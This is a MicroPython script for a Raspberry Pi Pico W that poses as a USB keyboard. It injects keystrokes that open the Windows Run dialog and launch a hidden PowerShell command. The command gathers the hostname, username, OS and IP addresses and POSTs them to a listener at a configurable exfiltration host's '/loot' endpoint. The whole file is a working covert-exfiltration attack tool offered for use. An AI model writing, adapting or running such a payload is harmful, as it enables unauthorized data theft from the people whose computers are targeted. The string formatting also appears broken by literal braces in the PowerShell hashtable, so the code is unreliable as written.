# Raspberry Pi Pico W — WiFi Exfil HID Payload (MicroPython)
# Injects keystrokes to collect system info, then exfils via Pico W's WiFi
#
# CONFIGURE BEFORE UPLOADING:
WIFI_SSID     = "YourWiFiSSID"
WIFI_PASSWORD = "YourWiFiPassword"
EXFIL_HOST    = "192.168.1.100"   # Your listener IP
EXFIL_PORT    = 8080
DELAY_MS      = 2000              # Wait before injecting

import time
import network
import urequests
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

def connect_wifi():
    wlan = network.WLAN(network.STA_IF)
    wlan.active(True)
    if not wlan.isconnected():
        wlan.connect(WIFI_SSID, WIFI_PASSWORD)
        timeout = 15
        while not wlan.isconnected() and timeout > 0:
            time.sleep(1)
            timeout -= 1
    return wlan.isconnected()

def inject_and_collect():
    kbd = Keyboard(usb_hid.devices)
    layout = KeyboardLayoutUS(kbd)

    time.sleep(DELAY_MS / 1000)

    # Windows: open Run, launch hidden PowerShell, collect info
    kbd.press(Keycode.GUI, Keycode.R)
    kbd.release_all()
    time.sleep(0.6)
    layout.write("powershell -WindowStyle Hidden -Command \"$r=@{H=(hostname);U=$env:USERNAME;OS=(Get-WmiObject Win32_OperatingSystem).Caption;IP=(Get-NetIPAddress -AddressFamily IPv4).IPAddress -join ','}; Invoke-RestMethod -Uri 'http://{}:{}/loot' -Method POST -Body ($r|ConvertTo-Json)\"".format(EXFIL_HOST, EXFIL_PORT))
    kbd.press(Keycode.ENTER)
    kbd.release_all()

# Connect WiFi first (background), then inject
connect_wifi()
inject_and_collect()
